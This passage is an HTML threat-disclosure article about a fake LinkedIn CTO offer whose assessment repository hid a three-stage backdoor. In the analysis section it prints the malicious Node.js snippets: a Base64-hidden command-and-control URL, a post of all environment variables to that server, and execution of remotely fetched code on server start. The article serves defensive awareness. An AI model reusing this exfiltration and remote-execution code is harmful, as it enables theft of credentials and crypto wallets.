@@ -1,0 +1,1108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>The CTO Offer That Was a Trojan Horse</title>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600;700&family=Playfair+Display:ital,wght@0,700;0,900;1,700&family=Source+Sans+3:wght@300;400;600;700&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+  :root {
+    --bg-primary: #f6f4f0;
+    --bg-secondary: #edeae4;
+    --bg-card: #ffffff;
+    --bg-code: #1e1e2e;
+    --text-primary: #1a1a2e;
+    --text-secondary: #4a4860;
+    --text-dim: #8a879a;
+    --accent-red: #d4293d;
+    --accent-amber: #c07800;
+    --accent-green: #1a8a6a;
+    --accent-blue: #2563eb;
+    --accent-red-glow: rgba(212, 41, 61, 0.08);
+    --accent-amber-glow: rgba(192, 120, 0, 0.06);
+    --border: #ddd8d0;
+    --font-display: 'Playfair Display', Georgia, serif;
+    --font-body: 'Source Sans 3', sans-serif;
+    --font-mono: 'IBM Plex Mono', monospace;
+  }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg-primary);
+    color: var(--text-primary);
+    font-family: var(--font-body);
+    font-size: 18px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  /* --- GRAIN OVERLAY --- */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.02'/%3E%3C/svg%3E");
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  /* --- LAYOUT --- */
+  .article-container {
+    max-width: 820px;
+    margin: 0 auto;
+    padding: 0 24px;
+  }
+
+  /* --- HERO --- */
+  .hero {
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    position: relative;
+    padding: 80px 0;
+    overflow: hidden;
+  }
+
+  .hero::before {
+    content: '';
+    position: absolute;
+    top: -200px;
+    right: -300px;
+    width: 800px;
+    height: 800px;
+    background: radial-gradient(circle, rgba(212, 41, 61, 0.06) 0%, transparent 70%);
+    pointer-events: none;
+  }
+
+  .hero-eyebrow {
+    font-family: var(--font-mono);
+    font-size: 13px;
+    font-weight: 600;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    color: var(--accent-red);
+    margin-bottom: 32px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    animation: fadeIn 0.8s ease both;
+  }
+
+  .hero-eyebrow::before {
+    content: '';
+    width: 40px;
+    height: 1px;
+    background: var(--accent-red);
+  }
+
+  .hero-title {
+    font-family: var(--font-display);
+    font-size: clamp(42px, 7vw, 80px);
+    font-weight: 900;
+    line-height: 1.05;
+    letter-spacing: -1px;
+    color: var(--text-primary);
+    margin-bottom: 32px;
+    animation: fadeIn 0.8s ease 0.15s both;
+  }
+
+  .hero-title em {
+    font-style: italic;
+    color: var(--accent-red);
+  }
+
+  .hero-subtitle {
+    font-size: 22px;
+    font-weight: 300;
+    color: var(--text-secondary);
+    max-width: 600px;
+    line-height: 1.6;
+    animation: fadeIn 0.8s ease 0.3s both;
+  }
+
+  .hero-meta {
+    margin-top: 48px;
+    padding-top: 32px;
+    border-top: 1px solid var(--border);
+    display: flex;
+    gap: 40px;
+    flex-wrap: wrap;
+    font-family: var(--font-mono);
+    font-size: 13px;
+    color: var(--text-dim);
+    animation: fadeIn 0.8s ease 0.45s both;
+  }
+
+  .hero-meta span {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .hero-meta .dot {
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background: var(--accent-red);
+    display: inline-block;
+  }
+
+  /* --- SEVERITY BANNER --- */
+  .severity-banner {
+    margin: 0 0 80px;
+    background: linear-gradient(135deg, rgba(212, 41, 61, 0.06) 0%, rgba(212, 41, 61, 0.02) 100%);
+    border: 1px solid rgba(212, 41, 61, 0.2);
+    border-radius: 12px;
+    padding: 32px 36px;
+    display: flex;
+    align-items: flex-start;
+    gap: 20px;
+    animation: fadeIn 0.8s ease 0.6s both;
+  }
+
+  .severity-icon {
+    width: 48px;
+    height: 48px;
+    flex-shrink: 0;
+    border-radius: 10px;
+    background: rgba(212, 41, 61, 0.1);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 24px;
+  }
+
+  .severity-content h3 {
+    font-family: var(--font-mono);
+    font-size: 13px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: var(--accent-red);
+    margin-bottom: 8px;
+  }
+
+  .severity-content p {
+    color: var(--text-secondary);
+    font-size: 16px;
+    line-height: 1.6;
+  }
+
+  /* --- SECTIONS --- */
+  section {
+    margin-bottom: 80px;
+  }
+
+  .section-label {
+    font-family: var(--font-mono);
+    font-size: 12px;
+    font-weight: 600;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    color: var(--accent-amber);
+    margin-bottom: 16px;
+  }
+
+  h2 {
+    font-family: var(--font-display);
+    font-size: clamp(28px, 4vw, 40px);
+    font-weight: 700;
+    line-height: 1.15;
+    margin-bottom: 24px;
+    color: var(--text-primary);
+  }
+
+  h3 {
+    font-family: var(--font-body);
+    font-size: 22px;
+    font-weight: 700;
+    margin-bottom: 12px;
+    color: var(--text-primary);
+  }
+
+  p {
+    margin-bottom: 20px;
+    color: var(--text-secondary);
+  }
+
+  p strong {
+    color: var(--text-primary);
+    font-weight: 600;
+  }
+
+  /* --- THE PLAYBOOK TIMELINE --- */
+  .playbook {
+    position: relative;
+    padding-left: 48px;
+    margin: 40px 0;
+  }
+
+  .playbook::before {
+    content: '';
+    position: absolute;
+    left: 15px;
+    top: 0;
+    bottom: 0;
+    width: 2px;
+    background: linear-gradient(to bottom, var(--accent-red), var(--accent-amber), var(--accent-red));
+    opacity: 0.4;
+  }
+
+  .playbook-step {
+    position: relative;
+    margin-bottom: 36px;
+    padding: 24px 28px;
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    transition: border-color 0.3s;
+    box-shadow: 0 2px 12px rgba(0, 0, 0, 0.04);
+  }
+
+  .playbook-step:hover {
+    border-color: rgba(192, 120, 0, 0.4);
+  }
+
+  .playbook-step::before {
+    content: attr(data-step);
+    position: absolute;
+    left: -48px;
+    top: 24px;
+    width: 32px;
+    height: 32px;
+    border-radius: 50%;
+    background: var(--bg-primary);
+    border: 2px solid var(--accent-amber);
+    color: var(--accent-amber);
+    font-family: var(--font-mono);
+    font-size: 13px;
+    font-weight: 700;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    line-height: 1;
+    text-align: center;
+    padding-top: 1px;
+  }
+
+  .playbook-step h4 {
+    font-family: var(--font-mono);
+    font-size: 14px;
+    font-weight: 700;
+    color: var(--accent-amber);
+    margin-bottom: 8px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+
+  .playbook-step p {
+    margin-bottom: 0;
+    font-size: 16px;
+    color: var(--text-secondary);
+    line-height: 1.6;
+  }
+
+  /* --- ATTACK CHAIN DIAGRAM --- */
+  .attack-chain {
+    margin: 48px 0;
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    padding: 40px 32px;
+    overflow-x: auto;
+    box-shadow: 0 2px 16px rgba(0, 0, 0, 0.05);
+  }
+
+  .attack-chain-title {
+    font-family: var(--font-mono);
+    font-size: 12px;
+    font-weight: 600;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    color: var(--text-dim);
+    margin-bottom: 32px;
+    text-align: center;
+  }
+
+  .chain-flow {
+    display: flex;
+    align-items: stretch;
+    gap: 0;
+    min-width: fit-content;
+    justify-content: center;
+    flex-wrap: wrap;
+  }
+
+  .chain-node {
+    flex: 0 0 auto;
+    width: 200px;
+    padding: 20px 16px;
+    background: var(--bg-secondary);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    text-align: center;
+    position: relative;
+    transition: all 0.3s;
+    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
+  }
+
+  .chain-node:hover {
+    border-color: var(--accent-red);
+    transform: translateY(-2px);
+    box-shadow: 0 8px 32px rgba(212, 41, 61, 0.1);
+  }
+
+  .chain-node .node-stage {
+    font-family: var(--font-mono);
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: var(--accent-red);
+    margin-bottom: 10px;
+  }
+
+  .chain-node .node-title {
+    font-family: var(--font-mono);
+    font-size: 13px;
+    font-weight: 600;
+    color: var(--text-primary);
+    margin-bottom: 8px;
+  }
+
+  .chain-node .node-file {
+    font-family: var(--font-mono);
+    font-size: 11px;
+    color: var(--text-dim);
+    word-break: break-all;
+  }
+
+  .chain-node .node-desc {
+    font-size: 12px;
+    color: var(--text-secondary);
+    margin-top: 10px;
+    line-height: 1.5;
+  }
+
+  .chain-arrow {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    width: 48px;
+    flex-shrink: 0;
+    color: var(--accent-red);
+    font-size: 22px;
+    opacity: 0.6;
+  }
+
+  /* --- CODE BLOCKS --- */
+  .code-block {
+    margin: 24px 0;
+    background: var(--bg-code);
+    border: 1px solid #2a2a3e;
+    border-radius: 10px;
+    overflow: hidden;
+    box-shadow: 0 4px 24px rgba(0, 0, 0, 0.12);
+  }
+
+  .code-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 12px 20px;
+    background: rgba(255, 255, 255, 0.04);
+    border-bottom: 1px solid #2a2a3e;
+    font-family: var(--font-mono);
+    font-size: 12px;
+    color: #7a778a;
+  }
+
+  .code-header .malicious-tag {
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: 1.5px;
+    text-transform: uppercase;
+    color: #ff5370;
+    background: rgba(255, 83, 112, 0.15);
+    padding: 3px 10px;
+    border-radius: 4px;
+  }
+
+  .code-block pre {
+    padding: 20px;
+    overflow-x: auto;
+    font-family: var(--font-mono);
+    font-size: 13.5px;
+    line-height: 1.7;
+    color: #c8c5d0;
+  }
+
+  .code-block .keyword { color: #c792ea; }
+  .code-block .string { color: #c3e88d; }
+  .code-block .func { color: #82aaff; }
+  .code-block .comment { color: #546e7a; font-style: italic; }
+  .code-block .danger { color: #ff5370; }
+  .code-block .param { color: #f78c6c; }
+  .code-block .highlight-line {
+    display: block;
+    background: rgba(255, 59, 59, 0.1);
+    margin: 0 -20px;
+    padding: 0 20px;
+    border-left: 3px solid var(--accent-red);
+  }
+
+  /* --- WHAT GETS STOLEN --- */
+  .exfil-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+    gap: 16px;
+    margin: 32px 0;
+  }
+
+  .exfil-item {
+    padding: 20px;
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    border-left: 3px solid var(--accent-red);
+    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
+  }
+
+  .exfil-item .env-var {
+    font-family: var(--font-mono);
+    font-size: 12px;
+    font-weight: 600;
+    color: var(--accent-amber);
+    margin-bottom: 6px;
+  }
+
+  .exfil-item .env-desc {
+    font-size: 14px;
+    color: var(--text-secondary);
+    margin: 0;
+    line-height: 1.5;
+  }
+
+  /* --- OBFUSCATION TABLE --- */
+  .obfuscation-table {
+    margin: 32px 0;
+    width: 100%;
+    border-collapse: collapse;
+  }
+
+  .obfuscation-table th,
+  .obfuscation-table td {
+    text-align: left;
+    padding: 16px 20px;
+    border-bottom: 1px solid var(--border);
+    font-size: 15px;
+  }
+
+  .obfuscation-table th {
+    font-family: var(--font-mono);
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: var(--text-dim);
+    background: var(--bg-primary);
+  }
+
+  .obfuscation-table td:first-child {
+    font-family: var(--font-mono);
+    font-size: 13px;
+    font-weight: 600;
+    color: var(--accent-amber);
+    white-space: nowrap;
+  }
+
+  .obfuscation-table td {
+    color: var(--text-secondary);
+  }
+
+  /* --- PATTERN CALLOUT --- */
+  .callout {
+    margin: 40px 0;
+    padding: 32px 36px;
+    border-radius: 12px;
+    position: relative;
+  }
+
+  .callout-warning {
+    background: linear-gradient(135deg, rgba(192, 120, 0, 0.06) 0%, rgba(192, 120, 0, 0.02) 100%);
+    border: 1px solid rgba(192, 120, 0, 0.25);
+  }
+
+  .callout-green {
+    background: linear-gradient(135deg, rgba(26, 138, 106, 0.06) 0%, rgba(26, 138, 106, 0.02) 100%);
+    border: 1px solid rgba(26, 138, 106, 0.25);
+  }
+
+  .callout h3 {
+    font-family: var(--font-mono);
+    font-size: 13px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 16px;
+  }
+
+  .callout-warning h3 { color: var(--accent-amber); }
+  .callout-green h3 { color: var(--accent-green); }
+
+  .callout p:last-child { margin-bottom: 0; }
+
+  .callout ul {
+    list-style: none;
+    padding: 0;
+    margin: 0;
+  }
+
+  .callout ul li {
+    position: relative;
+    padding-left: 24px;
+    margin-bottom: 12px;
+    color: var(--text-secondary);
+    font-size: 16px;
+    line-height: 1.6;
+  }
+
+  .callout ul li::before {
+    content: '→';
+    position: absolute;
+    left: 0;
+    font-family: var(--font-mono);
+    font-weight: 700;
+  }
+
+  .callout-warning ul li::before { color: var(--accent-amber); }
+  .callout-green ul li::before { color: var(--accent-green); }
+
+  /* --- BLOCKQUOTE --- */
+  blockquote {
+    margin: 40px 0;
+    padding: 24px 32px;
+    border-left: 3px solid var(--accent-red);
+    background: var(--bg-card);
+    border-radius: 0 10px 10px 0;
+    font-family: var(--font-display);
+    font-size: 22px;
+    font-style: italic;
+    line-height: 1.5;
+    color: var(--text-primary);
+    box-shadow: 0 2px 12px rgba(0, 0, 0, 0.04);
+  }
+
+  /* --- DIVIDER --- */
+  .divider {
+    margin: 80px auto;
+    width: 80px;
+    height: 2px;
+    background: linear-gradient(90deg, transparent, var(--accent-red), transparent);
+  }
+
+  /* --- FOOTER --- */
+  .article-footer {
+    padding: 60px 0 80px;
+    border-top: 1px solid var(--border);
+    text-align: center;
+  }
+
+  .article-footer p {
+    font-size: 16px;
+    color: var(--text-dim);
+    max-width: 540px;
+    margin: 0 auto;
+    line-height: 1.7;
+  }
+
+  .hashtags {
+    margin-top: 24px;
+    font-family: var(--font-mono);
+    font-size: 13px;
+    color: var(--accent-blue);
+    letter-spacing: 0.5px;
+  }
+
+  /* --- UTILS --- */
+  .mono { font-family: var(--font-mono); }
+  .red { color: var(--accent-red); }
+  .amber { color: var(--accent-amber); }
+  .green { color: var(--accent-green); }
+
+  code {
+    font-family: var(--font-mono);
+    font-size: 0.85em;
+    background: #f0ece6;
+    border: 1px solid var(--border);
+    padding: 2px 7px;
+    border-radius: 4px;
+    color: var(--accent-red);
+  }
+
+  /* --- ATTACK ANATOMY VISUAL --- */
+  .anatomy-visual {
+    margin: 48px 0;
+    display: flex;
+    flex-direction: column;
+    gap: 2px;
+  }
+
+  .anatomy-row {
+    display: flex;
+    gap: 2px;
+    align-items: stretch;
+  }
+
+  .anatomy-label {
+    width: 140px;
+    flex-shrink: 0;
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: 8px 0 0 8px;
+    padding: 16px;
+    display: flex;
+    align-items: center;
+    font-family: var(--font-mono);
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 1.5px;
+    text-transform: uppercase;
+    color: var(--text-dim);
+  }
+
+  .anatomy-content {
+    flex: 1;
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: 0 8px 8px 0;
+    padding: 16px 20px;
+    font-size: 15px;
+    color: var(--text-secondary);
+    line-height: 1.6;
+    display: flex;
+    align-items: center;
+  }
+
+  .anatomy-content .file-name {
+    font-family: var(--font-mono);
+    font-size: 12px;
+    color: var(--accent-red);
+    font-weight: 600;
+  }
+
+  /* --- ANIMATIONS --- */
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(16px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  .fade-section {
+    animation: fadeIn 0.6s ease both;
+  }
+
+  /* --- RESPONSIVE --- */
+  @media (max-width: 700px) {
+    .chain-flow {
+      flex-direction: column;
+      align-items: center;
+    }
+    .chain-arrow {
+      transform: rotate(90deg);
+      width: auto;
+      height: 32px;
+    }
+    .chain-node { width: 100%; max-width: 280px; }
+    .playbook { padding-left: 40px; }
+    .playbook-step::before { left: -40px; width: 28px; height: 28px; font-size: 12px; }
+    .anatomy-row { flex-direction: column; }
+    .anatomy-label { width: 100%; border-radius: 8px 8px 0 0; }
+    .anatomy-content { border-radius: 0 0 8px 8px; }
+    .hero-meta { gap: 20px; }
+    .severity-banner { flex-direction: column; }
+    .exfil-grid { grid-template-columns: 1fr; }
+    .code-block pre { font-size: 12px; }
+  }
+</style>
+</head>
+<body>
+
+<!-- ==================== HERO ==================== -->
+<div class="article-container">
+  <header class="hero">
+    <div class="hero-eyebrow">Threat Disclosure</div>
+    <h1 class="hero-title">The CTO Offer That Was a <em>Trojan Horse</em></h1>
+    <p class="hero-subtitle">
+      A recruiter on LinkedIn offered me a six-figure CTO role. The "technical assessment" was a GitHub repo with a remote code execution backdoor. Here's exactly how it worked — and how you can protect yourself.
+    </p>
+    <div class="hero-meta">
+      <span><span class="dot"></span> February 2026</span>
+      <span>12 min read</span>
+      <span>Severity: CRITICAL</span>
+    </div>
+  </header>
+
+  <!-- ==================== SEVERITY BANNER ==================== -->
+  <div class="severity-banner">
+    <div class="severity-icon">⚠</div>
+    <div class="severity-content">
+      <h3>Active Threat — This Is Happening Right Now</h3>
+      <p>
+        This is not theoretical. The malicious code I found was designed to steal every secret on your machine and open a remote shell for the attacker. If you're a developer or engineering leader who receives unsolicited job offers on LinkedIn, this article is for you.
+      </p>
+    </div>
+  </div>
+
+  <!-- ==================== THE PITCH ==================== -->
+  <section>
+    <div class="section-label">The Setup</div>
+    <h2>It starts with flattery</h2>
+    <p>
+      A few weeks ago, I received a LinkedIn connection request from someone representing a DeFi startup. The pitch was polished: <strong>CTO role, competitive salary, generous token allocation, equity</strong>. They had a website, a deck, a roadmap. Everything looked plausible enough to warrant a conversation.
+    </p>
+    <p>
+      Then came the request that always comes: <strong>"We'd love for you to review our MVP. Here's the GitHub repo."</strong>
+    </p>
+    <p>
+      This is where most developers would clone the repo, run <code>npm install</code>, and start poking around. I've learned not to do that — not before reading the code first. And that decision, once again, saved me.
+    </p>
+    <p>
+      <strong>Every single time I've been targeted, the company was in the blockchain or crypto space.</strong> DeFi protocols, NFT platforms, Web3 infrastructure — the specific project changes, but the industry never does. This is deliberate. Crypto developers routinely work with private keys, mnemonics, and wallet secrets in their local environments. A single environment variable exfiltration can drain wallets and steal funds irreversibly. On at least two other occasions, the malicious code was specifically designed to <strong>access my crypto wallet directly</strong> — not just server-side secrets, but browser-based wallet connections.
+    </p>
+    <p>
+      That said, <strong>this attack pattern works regardless of your industry.</strong> If you're a backend developer with database credentials in your <code>.env</code> file, a DevOps engineer with cloud provider keys, or a mobile developer with API secrets — you're just as vulnerable. The crypto angle is their preferred hunting ground, but the technique is universal.
+    </p>
+
+    <blockquote>
+      I've been targeted by this exact pattern at least twice a year for the past 3–4 years on LinkedIn. Every single company was in crypto or blockchain. And every single time, the moment they realize the attack failed, all messages and contact information vanish.
+    </blockquote>
+  </section>
+
+  <!-- ==================== THE PATTERN ==================== -->
+  <section>
+    <div class="section-label">The Playbook</div>
+    <h2>A pattern I've seen too many times</h2>
+    <p>
+      This wasn't an isolated incident. It's a repeatable, refined social engineering playbook that specifically targets developers, CTOs, and tech leads on LinkedIn — with a <strong>heavy focus on blockchain and crypto professionals</strong>. Here's how it always unfolds:
+    </p>
+
+    <div class="playbook">
+      <div class="playbook-step" data-step="1">
+        <h4>The Connection</h4>
+        <p>A recruiter, founder, or "Head of Engineering" sends a personalized connection request. The profile often looks legitimate — real-looking photo, connections in common, industry endorsements.</p>
+      </div>
+      <div class="playbook-step" data-step="2">
+        <h4>The Offer</h4>
+        <p>A leadership role at a crypto or DeFi startup with a compelling salary range ($180K–$250K+), token allocation, and generous equity. The urgency is calibrated — they need someone "immediately" but aren't pushy. Just flattering.</p>
+      </div>
+      <div class="playbook-step" data-step="3">
+        <h4>The Repository</h4>
+        <p>You're asked to clone a GitHub repo and "take a look" or "run it locally." The repo looks like a normal project — proper folder structure, README, package.json, framework code. But somewhere in the codebase, the payload is waiting.</p>
+      </div>
+      <div class="playbook-step" data-step="4">
+        <h4>The Disappearance</h4>
+        <p>Within days — sometimes hours — of the attack failing, every trace evaporates. Messages deleted. Profile gone or scrubbed. LinkedIn connection removed. As if the conversation never happened.</p>
+      </div>
+    </div>
+  </section>
+
+  <div class="divider"></div>
+
+  <!-- ==================== WHAT I FOUND ==================== -->
+  <section>
+    <div class="section-label">Technical Analysis</div>
+    <h2>Inside the malicious code</h2>
+    <p>
+      Instead of running the code, I read it. What I found was a <strong>three-stage attack chain</strong> spread across three different files — each one designed to look completely innocent on its own. Together, they form a remote code execution pipeline that activates <strong>the moment the server starts</strong>.
+    </p>
+  </section>
+
+  <!-- ==================== ATTACK CHAIN DIAGRAM ==================== -->
+  <div class="attack-chain">
+    <div class="attack-chain-title">Attack Chain — 3 Files Working Together</div>
+    <div class="chain-flow">
+      <div class="chain-node">
+        <div class="node-stage">Stage 1</div>
+        <div class="node-title">URL Decoder</div>
+        <div class="node-file">authService.js</div>
+        <div class="node-desc">Decodes the hidden attacker URL from Base64</div>
+      </div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-node">
+        <div class="node-stage">Stage 2</div>
+        <div class="node-title">Env Exfiltration</div>
+        <div class="node-file">users.js</div>
+        <div class="node-desc">Sends ALL environment variables to attacker's server</div>
+      </div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-node">
+        <div class="node-stage">Stage 3</div>
+        <div class="node-title">Remote Code Exec</div>
+        <div class="node-file">dataService.js</div>
+        <div class="node-desc">Executes arbitrary code from attacker's server with full Node.js access</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ==================== STAGE 1 ==================== -->
+  <section>
+    <h3>Stage 1 — The innocent-looking decoder</h3>
+    <p>
+      Buried in <code>authService.js</code>, a function called <code>parseToken</code> looks like standard JWT handling. In reality, its only purpose is to decode the attacker's Command & Control URL from a Base64 string.
+    </p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span>server/services/authService.js — lines 33-40</span>
+        <span class="malicious-tag">Malicious</span>
+      </div>
+      <pre><span class="keyword">const</span> <span class="func">parseToken</span> = (<span class="param">s</span>) => {
+  <span class="keyword">if</span> (!s) <span class="keyword">return</span> s;
+  <span class="keyword">try</span> {
+<span class="highlight-line">    <span class="keyword">return</span> <span class="func">Buffer.from</span>(s, <span class="string">"base64"</span>).<span class="func">toString</span>(<span class="string">"utf8"</span>);</span>
+  } <span class="keyword">catch</span> (err) {
+    <span class="keyword">return</span> s;
+  }
+};</pre>
+    </div>
+    <p>
+      Named to blend in. Functions like this exist in hundreds of real codebases. But here, it only serves one master.
+    </p>
+  </section>
+
+  <!-- ==================== STAGE 2 ==================== -->
+  <section>
+    <h3>Stage 2 — Stealing everything</h3>
+    <p>
+      In <code>users.js</code>, a function called <code>verify</code> sends the entire contents of <code>process.env</code> to whatever URL it receives. This is the exfiltration mechanism.
+    </p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span>server/mock/users.js — lines 23-25</span>
+        <span class="malicious-tag">Malicious</span>
+      </div>
+      <pre><span class="keyword">async function</span> <span class="func">verify</span>(<span class="param">api</span>) {
+<span class="highlight-line">  <span class="keyword">return</span> axios.<span class="func">post</span>(api, { ...<span class="danger">process.env</span> },</span>
+    { headers: { <span class="string">"x-secret-header"</span>: <span class="string">"secret"</span> } });
+}</pre>
+    </div>
+
+    <p>What gets sent to the attacker's server:</p>
+
+    <div class="exfil-grid">
+      <div class="exfil-item">
+        <div class="env-var">PRIVATE_KEYS / MNEMONIC</div>
+        <p class="env-desc">Wallet keys, seed phrases — instant fund theft</p>
+      </div>
+      <div class="exfil-item">
+        <div class="env-var">JWT_SECRET</div>
+        <p class="env-desc">Forge any authentication token</p>
+      </div>
+      <div class="exfil-item">
+        <div class="env-var">DATABASE_URL</div>
+        <p class="env-desc">Full database connection string</p>
+      </div>
+      <div class="exfil-item">
+        <div class="env-var">DB_PASSWORD</div>
+        <p class="env-desc">Direct database access</p>
+      </div>
+      <div class="exfil-item">
+        <div class="env-var">API_KEYS</div>
+        <p class="env-desc">Third-party service credentials</p>
+      </div>
+      <div class="exfil-item">
+        <div class="env-var">process.env.*</div>
+        <p class="env-desc">Literally everything in your environment</p>
+      </div>
+    </div>
+
+    <div class="callout callout-warning" style="margin-top: 24px;">
+      <h3>Beyond env vars: direct wallet access</h3>
+      <p>In past attacks I've encountered, the malicious code also attempted to <strong>interact with browser-based crypto wallets</strong> — trying to trigger transaction approvals, extract stored keys, or exploit wallet extensions. Server-side exfiltration is just one vector; the RCE payload (Stage 3) can do anything on your machine, including reading wallet files from disk or injecting code into browser processes.</p>
+    </div>
+  </section>
+
+  <!-- ==================== STAGE 3 ==================== -->
+  <section>
+    <h3>Stage 3 — Full remote control</h3>
+    <p>
+      The final payload in <code>dataService.js</code> ties it all together. It decodes the C2 URL, exfiltrates your secrets, receives JavaScript code from the attacker's server, and <strong>executes it with full access to Node.js</strong> — including <code>require()</code>, meaning <code>fs</code>, <code>child_process</code>, <code>net</code>, and everything else.
+    </p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span>server/services/dataService.js — lines 49-65</span>
+        <span class="malicious-tag">RCE Payload</span>
+      </div>
+      <pre><span class="keyword">async function</span> <span class="func">verifyToken</span>(<span class="param">req, res</span>) {
+  <span class="keyword">const</span> { data } = persistence;
+  <span class="func">verify</span>(<span class="func">parseToken</span>(<span class="string">"aHR0cHM6Ly9sb2NhdGUtbXkt..."</span>))
+    .<span class="func">then</span>((response) => {
+      console.<span class="func">log</span>(<span class="string">"Token received successfully"</span>);
+      <span class="keyword">const</span> responseData = response.data;
+<span class="highlight-line">      <span class="keyword">const</span> executor = <span class="keyword">new</span> (<span class="danger">Function.constructor</span>)(<span class="string">"require"</span>, responseData);</span>
+<span class="highlight-line">      executor(<span class="danger">require</span>);  <span class="comment">// Full Node.js access</span></span>
+      <span class="keyword">return</span> { success: <span class="keyword">true</span>, data: responseData };
+    });
+}
+<span class="danger">verifyToken();</span>  <span class="comment">// Auto-executes on server start</span></pre>
+    </div>
+
+    <p>
+      The <code>verifyToken()</code> call at the bottom means <strong>this runs automatically when the server starts</strong>. No route needs to be hit. No user action required. Just <code>npm start</code> — or even <code>npm install</code>, since the <code>package.json</code> had a <code>prepare</code> script that launched the server.
+    </p>
+  </section>
+
+  <div class="divider"></div>
+
+  <!-- ==================== OBFUSCATION ==================== -->
+  <section>
+    <div class="section-label">Tradecraft</div>
+    <h2>How they hid it in plain sight</h2>
+    <p>
+      The sophistication here isn't in the exploit itself — it's in the camouflage. Every function name, file location, and log message was chosen to blend into a normal codebase.
+    </p>
+
+    <table class="obfuscation-table">
+      <thead>
+        <tr>
+          <th>Technique</th>
+          <th>How it was used</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>Naming</td>
+          <td><code>parseToken</code>, <code>verify</code>, <code>verifyToken</code> — all sound like legitimate auth logic</td>
+        </tr>
+        <tr>
+          <td>Base64 encoding</td>
+          <td>The attacker's server URL is never visible as a plain string in the code</td>
+        </tr>
+        <tr>
+          <td>Multi-file split</td>
+          <td>Each file looks harmless alone; the chain only appears when traced across all three</td>
+        </tr>
+        <tr>
+          <td>Fake logging</td>
+          <td>"Token verified successfully" makes RCE look like routine auth in server logs</td>
+        </tr>
+        <tr>
+          <td>Plausible locations</td>
+          <td>Auth service, user mock data, data service — exactly where you'd expect token logic</td>
+        </tr>
+        <tr>
+          <td>Suspicious deps</td>
+          <td><code>fs</code> and <code>path</code> as npm packages — Node built-ins that should never be installed from npm</td>
+        </tr>
+      </tbody>
+    </table>
+  </section>
+
+  <div class="divider"></div>
+
+  <!-- ==================== WHY LINKEDIN ==================== -->
+  <section>
+    <div class="section-label">The Bigger Picture</div>
+    <h2>Why crypto developers on LinkedIn are the perfect targets</h2>
+    <p>
+      LinkedIn's professional context creates an implicit trust layer that attackers exploit. When someone reaches out about a job opportunity on LinkedIn, our default assumption is legitimacy — because that's what the platform is for. This is exactly what makes it so dangerous.
+    </p>
+    <p>
+      These aren't spray-and-pray phishing emails. These are <strong>targeted, researched, personalized approaches</strong>. They know your title, your tech stack, your career trajectory. They reference your work. The flattery feels earned. And the ask — "review our code" — is something any engineering leader would consider normal.
+    </p>
+    <p>
+      <strong>The blockchain and crypto industry is the primary target for a reason.</strong> In my experience, every single one of these attacks was wrapped in a crypto or DeFi project. The attackers know that developers in this space work with high-value secrets: wallet private keys, mnemonics, seed phrases, and contract deployment keys. In some of my past encounters, the malicious code didn't just exfiltrate environment variables — it attempted to <strong>interact with browser-based crypto wallets directly</strong>, trying to trigger approvals or extract stored keys. A successful attack doesn't just compromise a server — it can drain wallets with real, irreversible financial consequences.
+    </p>
+    <p>
+      But here's the thing: <strong>this technique isn't limited to crypto.</strong> Any developer who stores secrets in environment variables — database credentials, cloud API keys, payment processor tokens, OAuth secrets — is vulnerable to the exact same exfiltration chain. The attackers chose crypto because the payoff is immediate and untraceable, but the exploit works on every stack, in every industry.
